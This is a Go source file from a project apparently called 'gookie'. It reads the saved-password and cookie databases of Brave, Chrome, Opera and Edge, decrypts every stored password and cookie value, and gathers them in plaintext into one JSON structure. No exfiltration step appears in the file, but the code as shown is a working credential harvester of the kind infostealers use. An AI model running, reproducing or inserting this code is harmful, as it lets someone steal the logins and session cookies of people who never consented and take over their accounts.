package chromium

import (
	"fmt"
	"gookie/pkg/utils"
)

type BrowserDataFetcher struct{}

// NewBrowserDataFetcher creates a new BrowserDataFetcher.
func NewBrowserDataFetcher() *BrowserDataFetcher {
	return &BrowserDataFetcher{}
}

// GetAllBrowserData is a method of BrowserDataFetcher that gathers and returns all browser data.
func (b *BrowserDataFetcher) GetAllBrowserData() (JSONStruct, error) {
	bravePasswords, err := b.readChromiumPasswords(bravePasswordPath, braveKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readBravePasswords: %v", err)
	}

	braveCookies, err := b.readChromiumCookies(braveCookiesPath, braveKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readBraveCookies: %v", err)
	}

	chromePasswords, err := b.readChromiumPasswords(chromePasswordPath, chromeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readChromePasswords: %v", err)
	}

	chromeCookies, err := b.readChromiumCookies(chromeCookiesPath, chromeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readChromeCookies: %v", err)
	}

	operaPasswords, err := b.readChromiumPasswords(operaPasswordPath, operaKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readOperaPasswords: %v", err)
	}

	operaCookies, err := b.readChromiumCookies(operaCookiesPath, operaKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readOperaCookies: %v", err)
	}

	edgePasswords, err := b.readChromiumPasswords(edgePasswordPath, edgeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readEdgePasswords: %v", err)
	}

	edgeCookies, err := b.readChromiumCookies(edgeCookiesPath, edgeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readEdgeCookies: %v", err)
	}

	consolidated := JSONStruct{
		BravePasswords:  bravePasswords,
		BraveCookies:    braveCookies,
		ChromePasswords: chromePasswords,
		ChromeCookies:   chromeCookies,
		EdgePasswords:   edgePasswords,
		EdgeCookies:     edgeCookies,
		OperaPasswords:  operaPasswords,
		OperaCookies:    operaCookies,
	}

	return consolidated, nil
}

// readChromiumCookies is a method of BrowserDataFetcher that reads and decrypts cookies from a Chromium-based browser.
func (b *BrowserDataFetcher) readChromiumCookies(path, keyPath string) ([]Cookie, error) {
	rows, err := queryDatabase(path, chromiumCookieQuery, keyPath)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cookies []Cookie

	for rows.Next() {
		var cookie Cookie
		var expires, httpOnly, secure int64

		err = rows.Scan(&cookie.Domain, &expires, &httpOnly, &cookie.Name,
			&cookie.Path, &secure, &cookie.Value, &cookie.EncryptedValue)
		if err != nil {
			return nil, fmt.Errorf("error scanning row: %w", err)
		}

		cookie.Expires = utils.EpochToTime((expires / 1000000) - 11644473600)
		cookie.IsExpired = utils.IsExpired(expires)
		cookie.HttpOnly = utils.IntToBool(httpOnly)
		cookie.IsSecure = utils.IntToBool(secure)
		decrypted, err := decryptValue(cookie.EncryptedValue)
		if err != nil {
			return nil, fmt.Errorf("error decrypting: %w", err)
		}
		cookie.Value = string(decrypted)
		cookie.EncryptedValue = nil

		cookies = append(cookies, cookie)
	}
	return cookies, nil
}

// readChromiumPasswords is a method of BrowserDataFetcher that reads and decrypts passwords from a Chromium-based browser.
func (b *BrowserDataFetcher) readChromiumPasswords(path, keyPath string) ([]Password, error) {
	rows, err := queryDatabase(path, chromiumPasswordQuery, keyPath)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var passwords []Password

	for rows.Next() {
		var password Password

		err = rows.Scan(&password.URL, &password.Username, &password.PasswordEncrypted)
		if err != nil {
			return nil, fmt.Errorf("error scanning row: %w", err)
		}
		decrypted, err := decryptValue(password.PasswordEncrypted)
		if err != nil {
			return nil, err
		}
		password.PasswordDecrypted = string(decrypted)
		password.PasswordEncrypted = nil
		passwords = append(passwords, password)
	}
	return passwords, nil
}
